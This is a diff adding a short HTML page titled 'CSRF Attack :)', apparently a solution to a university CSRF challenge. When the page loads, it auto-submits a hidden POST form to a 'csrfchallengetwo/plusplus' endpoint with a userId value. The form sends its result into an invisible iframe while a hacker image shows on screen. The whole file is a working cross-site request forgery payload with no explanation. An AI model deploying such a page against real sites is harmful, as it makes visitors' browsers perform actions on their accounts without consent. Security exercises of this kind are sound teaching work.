@@ -1,0 +1,12 @@
+<html>
+  <head>
+    <title>CSRF Attack :)</title>
+  </head>
+  <body onload="document.CSRF_form.submit()">
+    <img src="https://teachprivacy.com/wp-content/uploads/Hacker5.jpg" />
+    <form action="https://snickerboa.it.liu.se/user/csrfchallengetwo/plusplus" name="CSRF_form" method="POST" target="hidden_results" style="display:none">
+      <input type="text" name="userId" value="1" />
+    </form>
+  </body>
+  <iframe name="hidden_results" style="display: none;"></iframe>
+</html>
